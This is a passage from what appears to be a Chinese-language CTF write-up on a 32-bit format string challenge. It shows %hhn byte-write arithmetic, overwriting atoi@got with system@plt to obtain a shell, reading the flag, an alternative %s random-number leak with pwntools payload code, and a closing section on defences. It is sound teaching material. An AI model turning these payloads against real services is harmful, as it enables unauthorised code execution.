+<td><code>%16c</code></td>
+<td>16</td>
+<td>144</td>
+<td><code>atoi_got+1</code></td>
+<td><code>0x90</code></td>
+</tr>
+</tbody></table>
+<p>最后内存里是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+0: 0x80</span><br><span class="line">+1: 0x90</span><br><span class="line">+2: 0x04</span><br><span class="line">+3: 0x08</span><br><span class="line">= 0x08049080</span><br></pre></td></tr></table></figure>
+
+<p>正好是 <code>system@plt</code>。</p>
+<div class="note warning flat"><p><strong>手动构造最容易错的两件事：</strong></p>
+<ol>
+<li><strong>偏移算错</strong>：本题是 10，不是 7。用 <code>%7$hhn</code> 会写到别的栈位置，轻则没反应，重则崩溃；</li>
+<li><strong>计数算错</strong>：每次 <code>%hhn</code> 写的是“累计字符数 mod 256”，不是“这一次打印了多少”。如果目标字节比当前累计小，要加 <code>0x100</code> 再减。</li>
+</ol>
+<p>所以实战里建议直接用 <code>fmtstr_payload</code>，手动推一遍是为了理解原理。</p>
+</div>
+
+<details class="note nx-note think">
+<summary><p><strong>思考 05｜已经打印了 128 个字符，下一个目标字节是 <code>0x10</code>，<code>%hhn</code> 前要再打印多少字符？如果目标字节是 <code>0x90</code> 呢？</strong></p>
+</summary>
+<div class="nx-note__body"><p><code>%hhn</code> 写的是“累计字符数 mod 256”，所以：</p>
+<ul>
+<li>目标 <code>0x90</code> &#x3D; 144：144 &gt; 128，再打印 <code>144 - 128 = 16</code> 个字符；</li>
+<li>目标 <code>0x10</code> &#x3D; 16：16 &lt; 128，不能倒着打印，要绕一圈：<code>16 + 256 - 128 = 144</code> 个字符。累计变成 <code>128 + 144 = 272 = 0x110</code>，低字节正好是 <code>0x10</code>。</li>
+</ul>
+<p>口诀：<strong>目标比当前大，直接减；目标比当前小，加 256 再减。</strong></p>
+</div>
+</details>
+
+<h2 id="第八步：打远程，拿-shell"><a href="#第八步：打远程，拿-shell" class="headerlink" title="第八步：打远程，拿 shell"></a>第八步：打远程，拿 shell</h2><p>运行 exp：</p>
+<p><img src="/2026/11/17/pwn-ctf-format-string-pwn5/image-5.png" alt="运行 exp"></p>
+<p><em>图 6：payload 发送成功，<code>atoi</code> 被改成 <code>system</code>，第二次输入 <code>/bin/sh</code> 后拿到 <code>$</code></em></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] atoi@got -&gt; 0x804c034</span><br><span class="line">[+] system@plt -&gt; 0x8049080</span><br><span class="line">[+] Opening connection to ... on port 9999: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ </span><br></pre></td></tr></table></figure>
+
+<p>拿到 shell 后读 flag：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/17/pwn-ctf-format-string-pwn5/image-6.png" alt="读取 flag"></p>
+<p><em>图 7：<code>cat /flag</code> 拿到 flag</em></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF2&#123;b0093050-400e-47ba-ac4c-16aa6c066822&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="为什么-shell-在-if-之前就出现了"><a href="#为什么-shell-在-if-之前就出现了" class="headerlink" title="为什么 shell 在 if 之前就出现了"></a>为什么 shell 在 <code>if</code> 之前就出现了</h3><p>看源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们改的是 <code>atoi@got</code>，所以 <code>atoi(nptr)</code> 实际变成了 <code>system(nptr)</code>。<code>system(&quot;/bin/sh&quot;)</code> 会<strong>在条件判断里</strong>启动 shell，并等它退出。也就是说：</p>
+<ul>
+<li>shell 是在 <code>atoi(nptr)</code> 这个表达式求值时出现的；</li>
+<li>程序自己的 <code>puts(&quot;ok!!&quot;)</code> 和 <code>system(&quot;/bin/sh&quot;)</code> 还没执行；</li>
+<li>你只要在 shell 里读 flag，读完退出即可，后面的比较结果已经不重要了。</li>
+</ul>
+<p>这也是 GOT 劫持比“泄漏随机数”更干脆的地方：<strong>根本不需要知道随机数是多少</strong>。</p>
+<details class="note nx-note think">
+<summary><p><strong>思考 06｜覆盖 <code>atoi@got</code> 后，原来的 <code>if (atoi(nptr) == dword_804C044)</code> 还成立吗？为什么我们还能拿到 shell？</strong></p>
+</summary>
+<div class="nx-note__body"><p>原来的比较逻辑已经不重要了。</p>
+<ul>
+<li><code>atoi(nptr)</code> 被替换成 <code>system(nptr)</code>；</li>
+<li><code>system(&quot;/bin/sh&quot;)</code> 会启动 shell，并<strong>等 shell 退出</strong>才返回；</li>
+<li>也就是说，shell 是在 <code>if</code> 的条件求值过程中出现的，程序还没走到 <code>==</code> 比较，也没走到 <code>if</code> 体里的 <code>puts(&quot;ok!!&quot;)</code>；</li>
+<li>你在 shell 里 <code>cat /flag</code>，读完退出即可。之后 <code>system</code> 返回一个退出状态，和随机数比较大概率不相等，程序可能打印 <code>fail</code> 然后结束，但 flag 已经拿到了。</li>
+</ul>
+<p>所以 GOT 劫持是“在条件里截胡”，不是“让条件成立”。</p>
+</div>
+</details>
+
+<h2 id="另一条路：泄漏随机数"><a href="#另一条路：泄漏随机数" class="headerlink" title="另一条路：泄漏随机数"></a>另一条路：泄漏随机数</h2><p>如果不改 GOT，也可以老老实实过随机数检查。</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>随机数在 <code>0x804C044</code>，用 <code>%s</code> 把它指向的 4 字节读出来：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(<span class="number">0x804C044</span>) + <span class="string">b&#x27;%10$s&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>p32(0x804C044)</code> 放在缓冲区开头，是第 10 个参数；</li>
+<li><code>%10$s</code> 把这个参数当地址，打印它指向的字符串。</li>
+</ul>
+<p>发过去之后，<code>printf</code> 会把 <code>0x804C044</code> 处的 4 字节当成字符串输出。收到后转成整数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data = p.recvuntil(<span class="string">b&#x27;your passwd:&#x27;</span>)</span><br><span class="line">leak = data.split(<span class="string">b&#x27;Hello,&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>][:-<span class="built_in">len</span>(<span class="string">b&#x27;your passwd:&#x27;</span>)]</span><br><span class="line">value = u32(leak.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(value).encode())</span><br></pre></td></tr></table></figure>
+
+<p>如果随机数正好等于 <code>value</code>，程序就会打印 <code>ok!!</code> 并执行它自己的 <code>system(&quot;/bin/sh&quot;)</code>。</p>
+<h3 id="为什么这条路径有坑"><a href="#为什么这条路径有坑" class="headerlink" title="为什么这条路径有坑"></a>为什么这条路径有坑</h3><p><code>%s</code> 遇到 <code>\x00</code> 就停。随机数 4 个字节里只要有一个空字节，泄漏就会变短：</p>
+<table>
+<thead>
+<tr>
+<th>情况</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>没有空字节</td>
+<td>4 字节都能读到</td>
+</tr>
+<tr>
+<td>空字节在末尾</td>
+<td>读到前 3 字节，补 <code>\x00</code> 还能还原</td>
+</tr>
+<tr>
+<td>空字节在中间</td>
+<td>后面的字节读不到，补零会猜错</td>
+</tr>
+</tbody></table>
+<p>概率不高，但确实存在。想稳一点，可以分别泄漏 <code>0x804C044</code>、<code>0x804C045</code>、<code>0x804C046</code>、<code>0x804C047</code> 四个地址，用分隔符拼起来；或者干脆走 GOT 劫持，绕开随机数。</p>
+<div class="note info flat"><p><strong>两条路的取舍：</strong></p>
+<ul>
+<li><strong>泄漏随机数</strong>：逻辑最贴题目本意，payload 短，但受空字节影响；</li>
+<li><strong>GOT 劫持</strong>：不关心随机数，稳定，顺便练 <code>%n</code> 写内存和 GOT&#x2F;PLT，是更“pwn”的做法。</li>
+</ul>
+<p>本文选后者，是因为这题的重点就是格式化字符串的<strong>写</strong>能力。</p>
+</div>
+
+<details class="note nx-note think">
+<summary><p><strong>思考 07｜<code>%10$s</code> 只读到 2 个字节，可能是什么原因？怎么设计一个不怕空字节的泄漏方案？</strong></p>
+</summary>
+<div class="nx-note__body"><p>大概率是随机数里出现了 <code>\x00</code>。<code>%s</code> 把参数当地址，一直打印到第一个 <code>\x00</code> 为止，所以空字节会截断泄漏。</p>
+<p>不怕空字节的方案是<strong>逐字节泄漏</strong>：把 4 个地址都放进缓冲区，用 4 个 <code>%s</code> 分别从 4 个字节开始读：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload  = p32(<span class="number">0x804C044</span>) + p32(<span class="number">0x804C045</span>)</span><br><span class="line">payload += p32(<span class="number">0x804C046</span>) + p32(<span class="number">0x804C047</span>)</span><br><span class="line">payload += <span class="string">b&#x27;%10$s.%11$s.%12$s.%13$s&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第 1 个 <code>%s</code> 从 <code>0x804C044</code> 开始读，第 2 个从 <code>0x804C045</code> 开始，以此类推；</li>
+<li>每个 <code>%s</code> 会读到下一个 <code>\x00</code> 为止，取每段的第一个字节就是目标字节；</li>
+<li>某一位是 <code>0x00</code> 时，对应段为空，直接补零。</li>
+</ul>
+<p>这样无论空字节在哪一位，4 个字节都能还原。如果不想处理这些边界，直接走 GOT 劫持更省心。</p>
+</div>
+</details>
+
+<h2 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h2><h3 id="1-格式化字符串的常用占位符"><a href="#1-格式化字符串的常用占位符" class="headerlink" title="1. 格式化字符串的常用占位符"></a>1. 格式化字符串的常用占位符</h3><table>
+<thead>
+<tr>
+<th>写法</th>
+<th>作用</th>
+<th>典型用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>%p</code></td>
+<td>打印参数的值（十六进制）</td>
+<td>泄漏栈地址、Canary、返回地址</td>
+</tr>
+<tr>
+<td><code>%s</code></td>
+<td>把参数当地址，打印字符串</td>
+<td>泄漏 GOT 里的 libc 地址、任意内存</td>
+</tr>
+<tr>
+<td><code>%n</code></td>
+<td>把已打印字符数写入 <code>int *</code></td>
+<td>4 字节任意写</td>
+</tr>
+<tr>
+<td><code>%hn</code></td>
+<td>写入 <code>short *</code></td>
+<td>2 字节任意写</td>
+</tr>
+<tr>
+<td><code>%hhn</code></td>
+<td>写入 <code>char *</code></td>
+<td>1 字节任意写</td>
+</tr>
+<tr>
+<td><code>%&lt;n&gt;c</code></td>
+<td>打印一个字符，左边补空格到宽度 <code>n</code></td>
+<td>控制 <code>%n</code> 的计数</td>
+</tr>
+<tr>
+<td><code>%&lt;k&gt;$p</code></td>
+<td>取第 <code>k</code> 个参数</td>
+<td>跳过前面的参数</td>
+</tr>
+</tbody></table>
+<h3 id="2-32-位和-64-位的区别"><a href="#2-32-位和-64-位的区别" class="headerlink" title="2. 32 位和 64 位的区别"></a>2. 32 位和 64 位的区别</h3><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>32 位</th>
+<th>64 位</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>参数位置</td>
+<td>全部在栈上</td>
+<td>前 6 个在寄存器，之后在栈上</td>
+</tr>
+<tr>
+<td>寄存器</td>
+<td>—</td>
+<td><code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code></td>
+</tr>
+<tr>
+<td>偏移常见值</td>
+<td>取决于栈帧</td>
+<td>常见 6、7、8 等</td>
+</tr>
+<tr>
+<td>地址长度</td>
+<td>4 字节，<code>p32</code></td>
+<td>8 字节，<code>p64</code></td>
+</tr>
+</tbody></table>
+<p>64 位下第一个可变参数在 <code>rsi</code>（<code>rdi</code> 是格式串），第 7 个才到栈上；所以找偏移时经常看到 <code>%6$p</code>、<code>%7$p</code> 这类写法。本题是 32 位，所有参数都在栈上。</p>
+<details class="note nx-note think">
+<summary><p><strong>思考 08｜如果这题是 64 位，<code>printf(buf)</code> 的前几个参数在哪？偏移还会是 10 吗？</strong></p>
+</summary>
+<div class="nx-note__body"><p>不会还是 10。64 位下：</p>
+<ul>
+<li><code>rdi</code> 放格式串指针 <code>buf</code>；</li>
+<li><code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code> 放前 5 个可变参数；</li>
+<li>第 6 个可变参数开始才去栈上拿。</li>
+</ul>
+<p>所以 <code>%p</code> 的前几个值来自寄存器，<code>buf</code> 的开头通常对应 <code>%6$p</code>、<code>%7$p</code> 或 <code>%8$p</code>，具体看编译器和栈布局，仍然要用脚本测。地址也要从 <code>p32</code> 换成 <code>p64</code>，<code>elf.got</code> &#x2F; <code>elf.plt</code> 的地址是 8 字节。</p>
+<p>一句话：<strong>32 位全在栈上，64 位先寄存器后栈；偏移永远实测。</strong></p>
+</div>
+</details>
+
+<h3 id="3-n-到底写了什么"><a href="#3-n-到底写了什么" class="headerlink" title="3. %n 到底写了什么"></a>3. <code>%n</code> 到底写了什么</h3><p><code>%n</code> 写入的是<strong>到目前为止 printf 已经输出的字符总数</strong>，包括：</p>
+<ul>
+<li>格式串里的普通字符；</li>
+<li><code>%c</code> 打印的字符；</li>
+<li><code>%d</code>、<code>%x</code> 等格式化后的字符；</li>
+<li>宽度补的空格。</li>
+</ul>
+<p>它<strong>不包括</strong> <code>%n</code> 自己（因为 <code>%n</code> 不输出字符）。</p>
+<p>所以控制写入值的方法是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先打印 N 个字符，再用 %hhn 写 N mod 256</span><br></pre></td></tr></table></figure>
+
+<p>如果要写的字节比当前计数小，就多打印 <code>0x100</code> 个字符，让计数绕一圈，低字节仍然是目标值。</p>
+<h3 id="4-GOT、PLT-与延迟绑定"><a href="#4-GOT、PLT-与延迟绑定" class="headerlink" title="4. GOT、PLT 与延迟绑定"></a>4. GOT、PLT 与延迟绑定</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">call atoi@plt</span><br><span class="line">      │</span><br><span class="line">      ▼</span><br><span class="line">atoi@plt: jmp [atoi@got]  ──►  GOT 里的地址</span><br><span class="line">                                  │</span><br><span class="line">                    第一次：指向解析器</span><br><span class="line">                    之后：指向真实 atoi</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>概念</th>
+<th>位置</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GOT</td>
+<td>数据段</td>
+<td>存函数真实地址</td>
+</tr>
+<tr>
+<td>PLT</td>
+<td>代码段</td>
+<td>跳板，跳转到 GOT</td>
+</tr>
+<tr>
+<td>延迟绑定</td>
+<td>运行时</td>
+<td>第一次调用才解析，之后走缓存</td>
+</tr>
+<tr>
+<td>Partial RELRO</td>
+<td>保护属性</td>
+<td>GOT 可写</td>
+</tr>
+<tr>
+<td>Full RELRO</td>
+<td>保护属性</td>
+<td>GOT 只读</td>
+</tr>
+</tbody></table>
+<h3 id="5-为什么写-system-plt-而不是-system-got"><a href="#5-为什么写-system-plt-而不是-system-got" class="headerlink" title="5. 为什么写 system@plt 而不是 system@got"></a>5. 为什么写 <code>system@plt</code> 而不是 <code>system@got</code></h3><ul>
+<li><code>system@plt</code> 是程序里现成的跳板，地址固定（No PIE），不需要知道 libc 基址；</li>
+<li><code>system@got</code> 里存的是 libc 中 <code>system</code> 的真实地址，受 ASLR 影响，除非先泄漏 libc，否则不知道；</li>
+<li>把 <code>atoi@got</code> 改成 <code>system@plt</code>，调用 <code>atoi</code> 时会先跳到 <code>system@plt</code>，再由它解析&#x2F;跳转到真正的 <code>system</code>。</li>
+</ul>
+<h3 id="6-为什么选-atoi"><a href="#6-为什么选-atoi" class="headerlink" title="6. 为什么选 atoi"></a>6. 为什么选 <code>atoi</code></h3><p><code>atoi</code> 在这题里几乎是“为利用量身定做”的：</p>
+<ul>
+<li>它在 <code>printf(buf)</code> 之后才被调用，来得及改 GOT；</li>
+<li>它的参数是 <code>nptr</code>，也就是我们第二次输入的内容；</li>
+<li>它的返回值只用于和随机数比较，改掉之后原来的比较逻辑就废了；</li>
+<li><code>system</code> 的 PLT 已经存在（源码里有 <code>system(&quot;/bin/sh&quot;)</code>），不用自己找 libc。</li>
+</ul>
+<p>如果题目把 <code>atoi</code> 换成 <code>strcmp</code>、<code>strlen</code> 之类，思路仍然一样：<strong>找一个“参数可控、在漏洞点之后被调用”的函数，把它的 GOT 改成 <code>system</code>。</strong></p>
+<h3 id="7-为什么-printf-和-atoi-的调用顺序很重要"><a href="#7-为什么-printf-和-atoi-的调用顺序很重要" class="headerlink" title="7. 为什么 printf 和 atoi 的调用顺序很重要"></a>7. 为什么 <code>printf</code> 和 <code>atoi</code> 的调用顺序很重要</h3><p><code>printf</code> 是漏洞点，<code>atoi</code> 是目标。利用顺序是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">printf(buf)  ──► 改写 atoi@got</span><br><span class="line">      │</span><br><span class="line">      ▼</span><br><span class="line">printf(&quot;your passwd:&quot;)</span><br><span class="line">      │</span><br><span class="line">      ▼</span><br><span class="line">read(0, nptr, 0xF)</span><br><span class="line">      │</span><br><span class="line">      ▼</span><br><span class="line">atoi(nptr)  ──►  system(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>如果 <code>atoi</code> 在 <code>printf(buf)</code> 之前就被调用过，GOT 里已经是解析后的地址，但我们仍然可以覆盖它；关键是<strong>覆盖之后还要有一次调用</strong>。这题正好在漏洞点之后调用 <code>atoi</code>。</p>
+<h3 id="8-fmtstr-payload-的-offset-是什么"><a href="#8-fmtstr-payload-的-offset-是什么" class="headerlink" title="8. fmtstr_payload 的 offset 是什么"></a>8. <code>fmtstr_payload</code> 的 offset 是什么</h3><p><code>fmtstr_payload(offset, writes, write_size=&#39;byte&#39;)</code> 的 <code>offset</code> 不是“第几个字节”，而是：</p>
+<blockquote>
+<p><strong>缓冲区开头对应 printf 的第几个参数。</strong></p>
+</blockquote>
+<p>本题缓冲区开头是第 10 个参数，所以写 <code>10</code>。如果偏移写错，生成的 <code>%N$hhn</code> 会写到错误的栈位置，GOT 根本改不到。</p>
+<h3 id="9-Canary、NX、PIE、RELRO-在这题里的角色"><a href="#9-Canary、NX、PIE、RELRO-在这题里的角色" class="headerlink" title="9. Canary、NX、PIE、RELRO 在这题里的角色"></a>9. Canary、NX、PIE、RELRO 在这题里的角色</h3><table>
+<thead>
+<tr>
+<th>保护</th>
+<th>本题状态</th>
+<th>是否影响利用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Canary</td>
+<td>开启</td>
+<td>不影响，因为不溢出</td>
+</tr>
+<tr>
+<td>NX</td>
+<td>开启</td>
+<td>不影响，因为不执行栈代码</td>
+</tr>
+<tr>
+<td>PIE</td>
+<td>关闭</td>
+<td><strong>有利</strong>，GOT&#x2F;PLT 地址固定</td>
+</tr>
+<tr>
+<td>Partial RELRO</td>
+<td>开启</td>
+<td><strong>有利</strong>，GOT 可写</td>
+</tr>
+</tbody></table>
+<p>这题的保护组合看起来很多，但真正挡住“栈溢出”的保护（Canary、NX）对格式化字符串都没用。<strong>保护要看它保护的是什么，不要看到 Canary 就以为没法打。</strong></p>
+<h2 id="新手常见问题"><a href="#新手常见问题" class="headerlink" title="新手常见问题"></a>新手常见问题</h2><div class="note info flat"><p><strong>Q1：为什么 <code>printf(buf)</code> 有漏洞？</strong></p>
+<p>因为 <code>buf</code> 被当成了格式串。只要用户输入里带 <code>%p</code>、<code>%s</code>、<code>%n</code>，printf 就会把它们当成格式说明符，去栈上&#x2F;寄存器里找参数。正确写法是 <code>printf(&quot;%s&quot;, buf)</code>，让用户输入永远是数据。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q2：偏移为什么是 10，不是 1？</strong></p>
+<p>因为 <code>printf</code> 的可变参数从格式串指针后面的第一个栈槽开始算，而 <code>buf</code> 在栈帧里离格式串指针有一段距离。本题实测第 10 个参数正好是 <code>buf</code> 的开头。具体数字取决于编译器的栈布局，必须用 <code>%p</code> 脚本测。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q3：<code>%p</code> 和 <code>%s</code> 有什么区别？</strong></p>
+<p><code>%p</code> 打印参数本身的值，比如 <code>0x804c044</code>；<code>%s</code> 把参数当地址，打印这个地址指向的字符串。想泄漏某个地址里的内容，用 <code>%s</code>；想泄漏栈上的值，用 <code>%p</code>。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q4：<code>%n</code>、<code>%hn</code>、<code>%hhn</code> 怎么选？</strong></p>
+<p>看要写多少字节。<code>%n</code> 写 4 字节，<code>%hn</code> 写 2 字节，<code>%hhn</code> 写 1 字节。写 GOT 这种地址时，用 <code>%hhn</code> 逐字节写最稳，因为每次最多打印 255 个字符；用 <code>%n</code> 要打印上亿个字符，程序会崩。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q5：为什么用 <code>%hhn</code> 而不是 <code>%n</code>？</strong></p>
+<p><code>atoi@got</code> 要写 <code>0x08049080</code>，十进制约 1.34 亿。<code>%n</code> 要求 printf 先输出这么多字符，实际打不出来。<code>%hhn</code> 把它拆成 4 个字节，每次最多 255 个字符，4 次就写完。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q6：GOT 和 PLT 是什么关系？</strong></p>
+<p>PLT 是代码段里的跳板，<code>atoi@plt</code> 会执行 <code>jmp [atoi@got]</code>；GOT 是数据段里的地址表，存着 <code>atoi</code> 的真实地址。改 GOT 就是改“跳板要跳去哪”。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q7：为什么 Partial RELRO 能改 GOT？</strong></p>
+<p>Partial RELRO 只保护 <code>.got</code> 的一部分，<code>.got.plt</code> 仍然可写；Full RELRO 会在启动时解析所有符号并把 GOT 设成只读，那时这种改法就失效了。<code>checksec</code> 看到 <code>Partial RELRO</code> 就可以考虑 GOT 劫持。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q8：为什么覆盖 <code>atoi</code>，不覆盖 <code>printf</code> 或 <code>system</code>？</strong></p>
+<p><code>printf</code> 正在执行，改它来不及影响当前调用；<code>system</code> 是我们要跳过去的目标，改它没意义。<code>atoi</code> 在漏洞点之后被调用，参数又是我们第二次输入的内容，最适合被改成 <code>system</code>。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q9：为什么发两次？第二次为什么是 <code>/bin/sh</code>？</strong></p>
+<p>第一次发格式化字符串 payload，改写 <code>atoi@got</code>；第二次发 <code>/bin/sh</code>，它会作为 <code>nptr</code> 传给已经被改成 <code>system</code> 的 <code>atoi</code>，于是执行 <code>system(&quot;/bin/sh&quot;)</code>。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q10：为什么 shell 出现时还没打印 <code>ok!!</code>？</strong></p>
+<p>因为 shell 是在 <code>if ( atoi(nptr) == ... )</code> 的条件求值里启动的：<code>atoi(nptr)</code> 已经变成 <code>system(nptr)</code>，<code>system</code> 会等 shell 退出才返回。程序自己的 <code>puts(&quot;ok!!&quot;)</code> 在 <code>if</code> 体里，还没轮到。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q11：泄漏随机数的解法怎么处理空字节？</strong></p>
+<p><code>%s</code> 遇到 <code>\x00</code> 会停。可以先读一段，如果不足 4 字节就在末尾补 <code>\x00</code>；如果空字节在中间，补零会猜错。更稳的做法是分别泄漏 <code>0x804C044</code> 到 <code>0x804C047</code> 四个地址，用分隔符拼接；或者直接用 GOT 劫持绕开随机数。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q12：有 Canary 为什么还能打？</strong></p>
+<p>Canary 防的是栈溢出，不是格式化字符串。这题的 <code>read</code> 只读 99 字节到 100 字节的 <code>buf</code>，不会覆盖 Canary；<code>printf</code> 只是按参数序号读栈，不写栈。保护要看它保护的对象。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q13：32 位和 64 位的偏移为什么不一样？</strong></p>
+<p>32 位所有参数都在栈上；64 位前 6 个参数在寄存器里，第 7 个才到栈上。所以同样的 <code>printf(buf)</code>，32 位可能偏移 10，64 位可能偏移 6、7、8。做题时一定要用脚本测。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q14：远程连不上怎么办？</strong></p>
+<p>先确认主机名是 <code>*.tcp-ctf2.dasctf.com</code>、端口 <code>9999</code>、<code>remote</code> 写了 <code>ssl=True, sni=HOST</code>。平台地址是临时的，过期失效很正常，换一个新环境再试。</p>
+</div>
+
+<h2 id="完整流程速查"><a href="#完整流程速查" class="headerlink" title="完整流程速查"></a>完整流程速查</h2><table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>目的</th>
+<th>操作</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>看文件</td>
+<td><code>file pwn8</code>，确认 32 位、动态链接、stripped</td>
+</tr>
+<tr>
+<td>2</td>
+<td>看保护</td>
+<td><code>checksec --file=pwn8</code>，Canary、NX、Partial RELRO、No PIE</td>
+</tr>
+<tr>
+<td>3</td>
+<td>看 main</td>
+<td>IDA <code>F5</code>，找到 <code>printf(buf)</code>、<code>atoi(nptr)</code>、<code>system(&quot;/bin/sh&quot;)</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>测偏移</td>
+<td><code>AAAA.%p...</code>，找 <code>41414141</code>，本题为 10</td>
+</tr>
+<tr>
+<td>5</td>
+<td>找地址</td>
+<td><code>elf.got[&#39;atoi&#39;]</code> &#x3D; <code>0x804c034</code>，<code>elf.plt[&#39;system&#39;]</code> &#x3D; <code>0x8049080</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>写 GOT</td>
+<td><code>fmtstr_payload(10, &#123;atoi_got: system_plt&#125;, write_size=&#39;byte&#39;)</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>发两次</td>
+<td>第 1 次 payload，第 2 次 <code>/bin/sh</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td>拿 shell</td>
+<td><code>p.interactive()</code>，<code>cat /flag</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td>备选</td>
+<td><code>%s</code> 泄漏 <code>0x804C044</code> 随机数，再发十进制值</td>
+</tr>
+</tbody></table>
+<h2 id="顺手聊聊怎么防"><a href="#顺手聊聊怎么防" class="headerlink" title="顺手聊聊怎么防"></a>顺手聊聊怎么防</h2><p>格式化字符串漏洞的根因只有一个：<strong>用户输入被当成了格式串。</strong></p>
+<table>
+<thead>
+<tr>
+<th>优先级</th>
+<th>措施</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>★★★</td>
+<td><strong>永远写 <code>printf(&quot;%s&quot;, buf)</code></strong></td>
+<td>用户输入只作为参数，不作为格式串</td>
+</tr>
+<tr>
+<td>★★★</td>
+<td><strong>编译时加 <code>-Wformat-security</code></strong></td>
+<td>让 <code>printf(buf)</code> 这类写法直接报警告</td>
+</tr>
+<tr>
+<td>★★☆</td>
+<td><strong>开启 Full RELRO</strong></td>
+<td>GOT 只读，GOT 劫持失效</td>
+</tr>
+<tr>
+<td>★★☆</td>
+<td><strong>开启 PIE</strong></td>
+<td>代码段地址随机化，增加写地址的难度</td>
+</tr>
+<tr>
+<td>★★☆</td>
+<td><strong>开启 FORTIFY_SOURCE</strong></td>
+<td>部分格式化函数会做检查</td>
+</tr>
+<tr>
+<td>★☆☆</td>
+<td><strong>代码审计 &#x2F; 静态分析</strong></td>
+<td>搜索 <code>printf(</code>、<code>fprintf(</code>、<code>sprintf(</code> 的可控参数</td>
+</tr>
+</tbody></table>
+<p>正确的写法：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);   <span class="comment">// 正确：buf 是数据</span></span><br><span class="line"><span class="built_in">printf</span>(buf);         <span class="comment">// 错误：buf 是格式串</span></span><br></pre></td></tr></table></figure>
+
+<p>如果确实需要格式化，也要限制格式串的来源，不要让用户完全控制。</p>
